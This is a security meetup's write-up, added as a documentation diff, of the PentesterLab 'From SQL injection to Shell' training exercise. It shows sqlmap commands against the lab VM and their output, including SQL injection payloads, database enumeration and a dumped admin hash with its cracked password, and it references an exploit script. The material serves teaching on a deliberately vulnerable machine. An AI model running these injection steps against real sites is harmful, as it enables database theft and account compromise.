@@ -1,0 +1,115 @@
+.. include:: /pentest_links.txt
+
+.. _PentesterLabSQLi2Shell:
+
+****************************************
+PentesterLab From SQL injection to Shell
+****************************************
+
+This is to document the meetup’s efforts responding to the challenge `PentesterLab From SQL injection to Shell <https://pentesterlab.com/exercises/from_sqli_to_shell/>`_. PentesterLab's writeup `from_sqli_to_shell.pdf <http://download.vulnhub.com/pentesterlab/from_sqli_to_shell.pdf>`_ is a very thorough and complete description of the browser-based approach to solving the challenge and we won't reproduce that here. There are 2 other approaches: a command-line equivalent to the documented browser-based approach, and the much simpler approach using `sqlmap`_. Here we document the 2 other approaches: first we provide a quick-and-dirty shell script that can be cut-and-pasted into the command line; second, we show the impressively short `sqlmap`_ approach. We recommend going through the manual browser or command line version of the challenge first to learn the concepts. Then step through the `sqlmap`_ version to appreciate all the steps handled by `sqlmap`_ behind the scenes. 
+
+The VM is provided as an iso file so should run on any virtualization platform. For configuration purposes the OS is Debian 6.0.5. The VM is called vulnerable and boots directly into a shell session.
+
+
+
+manual SQL injection
+====================
+
+Download :download:`from_sql_injection_to_shell_exploit.sh </challenges/from_sql_injection_to_shell_exploit.sh>`, the manual, step-by-step command line script for the challenge. Run ``./from_sql_injection_to_shell_exploit.sh IP`` where IP is vulnerable's IP address.
+
+.. literalinclude:: /challenges/from_sql_injection_to_shell_exploit.sh
+   :language: bash
+
+
+exploit simplification with sqlmap
+==================================
+
+Here is the much simpler `sqlmap`_ approach. Change TARGET to vulnerable's IP address. `sqlmap`_ is run 4 times: (1) to verify SQL injection is possible; (2) to list available databases; (3) to list tables within a selected database; then (4) to dump the selected table (users). `sqlmap`_ provided the added benefit of cracking the password found in the users table. We leave off the uploading of the exploitation php script which you can use from the last few lines of the command line script immediately above. Here is the ``bash`` code:
+
+.. code-block:: bash
+
+  TARGET=192.168.1.102
+  # Check to see if sql injection possible
+  rm -rf sqlmap
+  sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql
+  # Get available databases
+  sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql --dbs
+  # List tables in photoblog table
+  sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql -D photoblog --tables
+  # Dump the users table - sqlmap actually cracks the password too
+  sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql -D photoblog -T users --dump
+
+And here is the output from running the ``bash`` code:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ # Check to see if sql injection possible
+  hacker@kali:~$ sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql
+  ###################### SNIP ######################
+  sqlmap identified the following injection points with a total of 40 HTTP(s) requests:
+  ---
+  Place: GET
+  Parameter: id
+      Type: boolean-based blind
+      Title: AND boolean-based blind - WHERE or HAVING clause
+      Payload: id=1 AND 1633=1633
+
+      Type: error-based
+      Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+      Payload: id=1 AND (SELECT 7688 FROM(SELECT COUNT(*),CONCAT(0x7176797571,(SELECT (CASE WHEN (7688=7688) THEN 1 ELSE 0 END)),0x7177736d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+      Type: UNION query
+      Title: MySQL UNION query (NULL) - 4 columns
+      Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7176797571,0x6f457757694572625645,0x7177736d71),NULL,NULL#
+
+      Type: AND/OR time-based blind
+      Title: MySQL > 5.0.11 AND time-based blind
+      Payload: id=1 AND SLEEP(5)
+  ---
+  [17:54:25] [INFO] the back-end DBMS is MySQL
+  web server operating system: Linux Debian 6.0 (squeeze)
+  web application technology: PHP 5.3.3, Apache 2.2.16
+  back-end DBMS: MySQL 5.0
+  ###################### SNIP ######################
+  hacker@kali:~$ # Get available databases
+  hacker@kali:~$ sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql --dbs
+  ###################### SNIP ######################
+  available databases [2]:
+  [*] information_schema
+  [*] photoblog
+  ###################### SNIP ######################
+  hacker@kali:~$ # List tables in photoblog table
+  hacker@kali:~$ sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql -D photoblog --tables
+  ###################### SNIP ######################
+  [17:59:18] [INFO] fetching tables for database: 'photoblog'
+  Database: photoblog
+  [3 tables]
+  +------------+
+  | categories |
+  | pictures   |
+  | users      |
+  +------------+
+  ###################### SNIP ######################
+  hacker@kali:~$ # Dump the users table - sqlmap actually cracks the password too
+  hacker@kali:~$ sqlmap --random-agent -u "http://$TARGET/cat.php?id=1" \
+      --batch --output-dir $PWD/sqlmap --dbms=mysql -D photoblog -T users --dump
+  ###################### SNIP ######################
+  [18:00:51] [INFO] cracked password 'P4ssw0rd' for hash '8efe310f9ab3efeae8d410a8e0166eb2'
+  [18:01:55] [INFO] postprocessing table dump                                    
+  Database: photoblog
+  Table: users
+  [1 entry]
+  +----+-------+---------------------------------------------+
+  | id | login | password                                    |
+  +----+-------+---------------------------------------------+
+  | 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+  +----+-------+---------------------------------------------+
+  ###################### SNIP ######################
